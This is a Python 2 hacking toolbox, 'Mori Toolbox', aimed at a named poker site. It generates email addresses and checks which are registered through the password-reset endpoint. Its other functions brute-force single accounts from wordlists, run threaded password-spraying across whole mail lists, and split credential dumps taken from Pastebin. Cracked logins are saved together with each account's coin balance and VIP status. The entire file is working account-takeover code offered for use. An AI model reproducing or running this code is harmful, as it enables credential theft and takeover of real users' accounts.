import random,os,sys,time,requests,re,shutil
from multiprocessing.pool import ThreadPool

os.system("clear")
#-*-coding:utf-8-*-
# Coded By Deray
'''
         Rebuild Copyright Can't make u real programmer
'''
# Report Bug On My Other Sosmed
# instagram: @reyy05_
# facebook: https://facebook.com/achmad.luthfi.hadi.3

# Manual Color

import sys

if ("linux" in sys.platform.lower()):

        W = '\033[1;37m'
        N = '\033[0m'
        R = '\033[1;37m\033[31m'
        B = '\033[1;37m\033[34m'
        G = '\033[1;32m'
        O = '\033[33m'
        C = '\033[36m'
        notice  = "{}{}[*]{} ".format(N,B,N)
        warning = "{}[-]{} ".format(R,N)
        good    = "{}[!]{} ".format(G,N)
        warn    = "{}[!]{} ".format(O,N)

else:

        W = ''
        N = ''
        R = ''
        B = ''
        G = ''
        O = ''
        C = ''
        notice  = ''
        warning = ''
        good    = ''
        warn    = ''



list=["""
{}
___  ___           _   _____           _ _               
|  \/  |          (_) |_   _|         | | |              
| .  . | ___  _ __ _    | | ___   ___ | | |__   _____  __
| |\/| |/ _ \| '__| |   | |/ _ \ / _ \| | '_ \ / _ \ \/ /
| |  | | (_) | |  | |   | | (_) | (_) | | |_) | (_) >  < 
\_|  |_/\___/|_|  |_|   \_/\___/ \___/|_|_.__/ \___/_/\_\\
{}                                                         
{}                                                         """.format(C,R,"="*65),"""
{}
    __  ___           _    ______            ____              
   /  |/  /___  _____(_)  /_  __/___  ____  / / /_  ____  _  __
  / /|_/ / __ \/ ___/ /    / / / __ \/ __ \/ / __ \/ __ \| |/_/
 / /  / / /_/ / /  / /    / / / /_/ / /_/ / / /_/ / /_/ />  <  
/_/  /_/\____/_/  /_/    /_/  \____/\____/_/_.___/\____/_/|_|  
   {}                                                          
{}""".format(B,O,"="*65),"""
{}
 ________________
< Mori - Toolbox >
 ----------------
       \   ,__,
        \  (oo)____
           (__)    )\ 
              ||--|| *
{}{}{}
""".format(C,R,"="*65,N),"""
 _______
<{} uh oh{} >
 -------
  \ 
   \                 __    Let's Hack Everything!!
    \               (OO)        Mori - Toolbox
     \              (  )
                    /--\ 
       __          / \  \ 
      UooU\.'@@@@@@'  \  )
      \__/(@@@@@@@@@@@) /
           (@@@@@@@@@)((
           'YY----YY'  \\
            ||    ||    >>{}
{}{}
""".format(G,N,O,"="*65,N),"""
 ____________________
< {}get the fuck honey{} >
 --------------------
        \   ^__^
         \  ({}$${})\_______
            (__)\       )\/\\    Mori - Toolbox
                ||----w |
                ||     ||
{}{}{}
""".format(R,N,G,N,N,C,"="*65,N),"""%s
 ____________________
< %sI'll stick your ass%s >
 --------------------
   \         ,        ,
    \       /(        )`
     \      \ \___   / |
            /- _  `-/  '
           (/\/ \ \   /\\    %sMori Toolbox%s
           / /   | `    \\
           O O   ) /    |
           `-^--'`<     '
          (_.)  _  )   /
           `.___/`    /
             `-----' /
<----.     __ / __   \\
<----|====O)))==) \) /====
<----'    `--' `.__,' \\
             |        |
              \       /
        ______( (_  / \______
      ,'  ,-----'   |        \\
      `--{__________)        \/%s
%s%s
"""%(R,G,R,N,R,N,"="*65,N),"""
		 ____________________
		<     Mori Toolbox    >
		 --------------------
		 \     /\  ___  /\\
		  \   // \/   \/ \\\\
		     ((    O O    ))
		      \\ /     \ //
		       \/  | |  \/ 
		        |  | |  |  
 		        |  | |  |  
 		        |   o   |  
		        | |   | |  
 		        |m|   |m| 
{}
""".format("="*65),"""

                   _   _____            _ _               
  /\/\   ___  _ __(_) /__   \___   ___ | | |__   _____  __
 /    \ / _ \| '__| |   / /\/ _ \ / _ \| | '_ \ / _ \ \/ /
/ /\/\ \ (_) | |  | |  / / | (_) | (_) | | |_) | (_) >  < 
\/    \/\___/|_|  |_|  \/   \___/ \___/|_|_.__/ \___/_/\_\\
                                                          
""","""

    __  ___           _    ______            ____              
   /  |/  /___  _____(_)  /_  __/___  ____  / / /_  ____  _  __
  / /|_/ / __ \/ ___/ /    / / / __ \/ __ \/ / __ \/ __ \| |/_/
 / /  / / /_/ / /  / /    / / / /_/ / /_/ / / /_/ / /_/ />  <  
/_/  /_/\____/_/  /_/    /_/  \____/\____/_/_.___/\____/_/|_|  
                                                               
""","""

  __  __         _   _____         _ _             
 |  \/  |___ _ _(_) |_   _|__  ___| | |__  _____ __
 | |\/| / _ \ '_| |   | |/ _ \/ _ \ | '_ \/ _ \ \ /
 |_|  |_\___/_| |_|   |_|\___/\___/_|_.__/\___/_\_\\
                                                   
"""]

def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(000.001)
        
def live():
	if os.path.exists('Live.txt'):
		if os.path.getsize("Live.txt") !=0:
			r=raw_input("File Live.txt Exists: [R]eplace or [A]ppend> ").lower()
			if r =="r":
				open("Live.txt","w").close()
				os.system("clear")
	else:
		open("Live.txt","w").close()

def println():
	os.system("clear")
	mengetik(random.choice(list))

def home():
	print N
	print """			[== MENU ==]\n\n
 {}[{}00{}]{} Remove Trash
 {}[{}01{}]{} Make An Email With Sequential Numbers
 {}[{}02{}]{} Query Without Numbers
 {}[{}03{}]{} Automatic Domain Extension
 {}[{}04{}]{} Bruteforce With Single Email Using Wordlist
 {}[{}05{}]{} Super MultiBruteforce Auto Crack Mailist
 {}[{}06{}]{} Empass Splitter
 {}[{}07{}]{} Geax Poker Mailist Checker
 {}[{}08{}]{} Super MultiBruteforce Auto Crack Mailist V.2
 {}[{}09{}]{} Exit.
 	""".format(N,G,N,G,N,G,N,G,N,G,N,G,N,G,N,G,N,G,N,G,N,G,N,G,N,G,N,G,N,G,N,G,N,G,N,G,N,R,N,R)


def pastebin():
	ps=raw_input("Pastebin link: ")
	if len(re.findall("raw",ps)) ==0:
		ps=ps.replace("pastebin.com/","pastebin.com/raw/")
	if len(re.findall("pastebin.com",ps))==0:
		exit("Pastebin link only.")
	sp=raw_input("Sparator: ")
	if len(re.findall(r""+sp,requests.get(ps).text)) ==0:
		exit("ERROR: non sparator: %s"%sp)
	res=raw_input("Result filename: ")

	for i in requests.get(ps).text.splitlines():
		ok=i.split(sp)[-0]
		open(res,"a+").write("%s\n"%ok)
		print "[ OK ]: %s"%ok
	print "\nResult: %s"%res
	raw_input("Press Enter To Menu...");main()

live()
		
class main:
	def __init__(self):
		println()
		home()
		self.menu()

	def menu(self):
		ch=raw_input("{}[{}Mori Toolbox/> {}".format(N,R,N))
		if ch in ["1","01"]:
			mengetik("{}INFO: {}use , for another domain, Ex: @gmail.com,@yahoo.com".format(G,N))
			number()
		elif ch =="":
			self.menu()
		elif ch in ["2","02"]:
			print "{}INFO: {}use , for another domain, Ex: @gmail.com,@yahoo.com".format(G,N)
			number(without=True)
		elif ch in ["3","03"]:
			automatic()
		elif ch in ["4","04"]:
			bruter()
		elif ch in ["5","05"]:
			multi()
		elif ch in ["6","06"]:
			pastebin()
		elif ch in ["7","07"]:
			mailcheck()
		elif ch in ["8","08"]:
			mbf2()
		elif ch in ["9","09"]:
			exit(B+"\ ( ^ ^ ) / Byeee."+N)
		elif ch in ["0","00"]:
			trash()
		elif ch in ["banner","reload","refresh","load","theme","b"]:
			main()
		else:
			print R+"ERROR: WRONG INPUT"+N;self.menu()
			
			
# <-- With Numbers -->

class number:
	def __init__(self,without=False):
		self.without=without
		self.result=[]
		self.list = []
		self.lo=0
		self.q()
	
	def q(self):
		self.do=raw_input("Domain Extensions: ").split(",")
		mengetik("{}INFO: {}use , for random QUERY, Ex: mori,moray,test".format(G,N))
		self.query()
			
	def query(self):
		self.qu=raw_input("Query: ").split(",")
		self.looping()
			
			
	def looping(self):
		try:
			self.loop=input("Loops : ")
		except Exception as e:
			print R+"ERROR: %s%s"%(e,N);self.looping()
		
		mengetik("Generating Random Email...")
		time.sleep(1)
		print 
		self.loop=self.loop+1
		for i in range(1,self.loop):
			if self.without ==True:
				r="%s%s"%(random.choice(self.qu),random.choice(self.do))
				self.list.append(r)
				print "%s. %s"%(i,r)
			else:
				r="%s%s%s"%(random.choice(self.qu),i,random.choice(self.do))
				self.list.append(r)
				print "%s. %s"%(i,r)
		mengetik("\nChecking %s Email From geaxpoker.com..."%len(self.list))
		ThreadPool(1).map(self.check,self.list)
		if len(self.result) !=0:
			print "\n%s Email Live! Saved To Live.txt"%len(self.result)
			raw_input("\nPress Enter To Menu...");main()
		else:
			print "\nNo Results Found:("
			raw_input("\nPress Enter To Menu...");main()
		
	def check(self,email):
		try:
			r=requests.post("https://api.geaxpoker.com/mobile/forget",data={"email":email}).text
			if len(re.findall("Email isn't exist.",r)) ==0:
				if email in open("Live.txt").read():
					pass
				else:
					self.result.append(email)
					print "\r%sLive : %s%s"%(G,email,N)
					open('Live.txt','a+').write('%s\n'%email)
		except:self.check(email)
		self.lo+=1
		print "\rChecking: %s/%s"%(self.lo,len(self.list)),;sys.stdout.flush()
		
		
# <-- automatic domain extension -->
class automatic:
	def __init__(self):
		self.a=[]
		self.lo=0
		self.result=[]
		self.domain=open("domains.txt").read().splitlines()
		mengetik("{}INFO: {}use , for random QUERY, Ex: mori,moray,test".format(G,N))
		self.q()
	
	def q(self):
		self.qu=raw_input('Query: ').split(",")
		self.loop()
			
	def loop(self):
		try:
			self.l=input("Loop: ")
		except Exception as e:
			print R+"ERROR: "+str(e)+"%s"%N;self.loop()
		print 
		self.l=self.l+1
		for i in range(1,self.l):
			r="%s@%s"%(random.choice(self.qu),random.choice(self.domain))
			self.a.append(r)
			print "%s. %s"%(i,r)
		mengetik("\nChecking %s Email From api.geaxpoker.com..."%len(self.a))
		ThreadPool(1).map(self.cek,self.a)
		if len(self.result) !=0:
			print "\n%s Email Live! Saved To Live.txt"%len(self.result)
			raw_input("\nPress Enter To Menu...");main()
		else:
			print "\nNo Results Found:("
			raw_input("\nPress Enter To Menu...");main()
			
			
	def cek(self,email):
		try:
			r=requests.post("https://api.geaxpoker.com/mobile/forget",data={"email":email}).text
			if len(re.findall("Email isn't exist.",r)) ==0:
				if email in open("Live.txt").read():
					pass
				else:
					self.result.append(email)
					print "\r%sLive : %s%s"%(G,email,N)
					open('Live.txt','a+').write('%s\n'%email)
		except:self.cek(email)
		self.lo+=1
		print "\rChecking: %s/%s"%(self.lo,len(self.a)),;sys.stdout.flush()
		

# <-- Bruteforce With Email -->
class bruter:
	def __init__(self):
		self.cracks=0
		self.email()
		
	def email(self):
		self.e=raw_input("Target Email: ")
		if self.e=="":
			self.email()
		else:
			self.wrld()
			
	def wrld(self):
		try:
			self.w=open(raw_input("Wordlist: ")).read().splitlines()
		except Exception as e:
			print "%sERROR: %s%s"%(R,e,N);self.wrld()
		self.thr()
		
	def thr(self):
		try:
			self.t=ThreadPool(input("Thread: "))
		except Exception as e:
			print "%sERROR %s%s"%(R,e,N);self.thr()
		self.t.map(self.crack,self.w)
	
	def crack(self,u):
		print("\rCracking: %s/%s"%(self.cracks,len(self.w))),;sys.stdout.flush()
		try:
			r=requests.post("https://api.geaxpoker.com/api/login.json",
				data={"device":"-1",
					"width":"320","version":"1.0","user":self.e,"pw":u}).json()
			if "sessid" in r.keys():
				res="\nPASSWORD FOUND: %s & Password: %s"%(self.e,u)
				open("Result.txt","a+").write(res+"\n")
				print res
				print "Result: Result.txt\r"
				os.system("killall -9 python2")
			else:
				self.cracks+=1
				
		except Exception as i:
			self.crack(u)

#<-- multibruteforce -->

class multi:
	def __init__(self):
		self.a=0
		self.b=[]
		self.mailist()
		
	def mailist(self):
		try:
			self.m=open(raw_input('Mailist File: ')).read().splitlines()
		except Exception as e:
			print "%sERROR: %s%s"%(R,e,N);self.mailist()
		self.t()
		
	def t(self):
		try:
			self.thr=ThreadPool(input('Thread: '))
		except Exception as e:
			print "%sERROR: %s%s"%(R,e,N);self.t()
		print "%sINFO: Result Saved To -> Hacked.txt%s"%(G,N)
		self.thr.map(self.crack,self.m)
		
	def crack(self,m):
		result = ''.join([i for i in m.split("@")[-0] if not i.isdigit()]).replace(".","").replace("_","")
		lists=[
			"%s123"%result,"%s1234"%result,
			"%s12345"%result,result*2,m.split("@")[-0],m.split("@")[-0]+"123",m,
			"%s123456"%result,"%s1234567"%result,"%s12345678"%result,"%s123456789"%result,
			"%s%s"%(result,random.randrange(0,1000))
		]
		for i in lists:
			try:
				self.crc(m,i)
			except:
				self.crc(m,i)
		self.a+=1
		print "\rCracking: %s/%s"%(self.a,len(self.m)),;sys.stdout.flush()
		
	def crc(self,m,i):
		r=requests.post("https://api.geaxpoker.com/api/login.json",
				data={"device":"-1",
					"width":"320","version":"1.0","user":m,"pw":i}).json()
		if "sessid" in r.keys():
			res="EMAIL: %s & Password: %s"%(m,i)
			print "\r%s%s%s"%(G,res,N)
			open("Hacked.txt","a+").write("%s\nCOIN: %s\nVIP: %s\n%s\n"%(res,r["coin"],r['vip'],"="*20))
			
			
			
class mailcheck:
	def __init__(self):
		self.ok=0
		self.email()
		
	def email(self):
		try:
			self.e=open(raw_input('Mailist File: ')).read().splitlines()
		except Exception as e:
			print "%sERROR: %s%s"%(R,e,N);self.email()
		self.res()
		
	def res(self):
		try:
			self.f=raw_input("Result File Name: ")
			open(self.f,"w").close()
			if self.f =="":
				self.res()
		except Exception as e:
			print "%sERROR: %s%s"%(R,e,N);self.res()
		self.t()
		
	def t(self):
		try:
			self.thr=ThreadPool(input("Thread: "))
		except Exception as e:
			print "%sERROR: %s%s"%(R,e,N);self.t()
		print "%sINFO: Result Saved To: %s%s"%(G,self.f,N)
		self.thr.map(self.cek,self.e)
		raw_input("\nFinished.\n%s Email Writted Successfully\nPress Enter To Menu..."%(len(open(self.f).read().splitlines())));main()
		
	def cek(self,email):
		try:
			r=requests.post("https://api.geaxpoker.com/mobile/forget",data={"email":email}).text
			if len(re.findall("Email isn't exist.",r)) ==0:
				live="%s\n"%email
				print "\rLIVE: %s"%live
				open(self.f,"a+").write("%s\n"%live)
		except Exception as e:
			self.cek(email)
		self.ok+=1
		print "\rChecking: %s/%s"%(self.ok,len(self.e)),;sys.stdout.flush()
			
class trash:
	def __init__(self):
		self.pepek=[]
		print 
		for i in os.listdir(os.getcwd()):
			if ".py" in i or "domains.txt" in i:
				continue
			else:
				self.pepek.append(i)
				print "%s. Remove '%s'"%(len(self.pepek),i)
		if len(self.pepek) ==0:
			print "%sNo Trash Detected.%s"%(R,N)
			raw_input("Press Enter To Menu...");main()
		else:
			print 
			self.pil()
			
	def pil(self):
		try:
			self.p=self.pepek[input("Choice Number: ")-1]
			print self.p
		except Exception as e:
			print "%sERROR: %s"%(e,N);self.pil()
		os.remove(self.p)
		if "Live.txt" in self.p:
			open("Live.txt","w").close()
		print "%s Successfully Deleted From This Directory: %s"%(self.p,os.getcwd())
		self.r=raw_input("[M]enu or [A]gain> ").lower()
		if self.r =="a":
			os.system("clear")
			trash()
		else:
			main()
			
			
#<--- mbf v 2 -->
class mbf2:
	def __init__(self):
		self.c=0
		self.e()
		
	def e(self):
		try:
			self.m=open(raw_input("Mailist File: ")).read().splitlines()
		except Exception as e:
			print "%sERROR: %s%s"%(R,e,N);self.e()
		self.pw()
	
	def pw(self):
		try:
			self.p=open(raw_input("Wordlist: ")).read().splitlines()
		except Exception as e:
			print "%sERROR: %s%s"%(R,e,N);self.pw()
		self.t()
		
	def t(self):
		try:
			self.th=ThreadPool(input("Thread: "))
		except Exception as e:
			print "%sERROR: %s%s"%(R,e,N);self.t()
		self.th.map(self.run,self.m)
		
	def run(self,email):
		for i in self.p:
			try:
				self.crack(email,i)
			except:
				self.crack(email,i)
		self.c+=1
		print "\rCracking: %s/%s"%(self.c,len(self.m)),;sys.stdout.flush()
				
	def crack(self,e,p):
		r=requests.post("https://api.geaxpoker.com/api/login.json",
				data={"device":"-1",
					"width":"320","version":"1.0","user":e,"pw":p}).json()
		if "sessid" in r.keys():
			res="\rPASSWORD FOUND: %s & Password: %s"%(e,p)
			open("Hacked.txt","a+").write("%s\nCOIN: %s\nVIP: %s\n%s\n"%(res,r["coin"],r['vip'],"="*20))
			print "\r%s%s%s"%(G,res,N)
		
main()
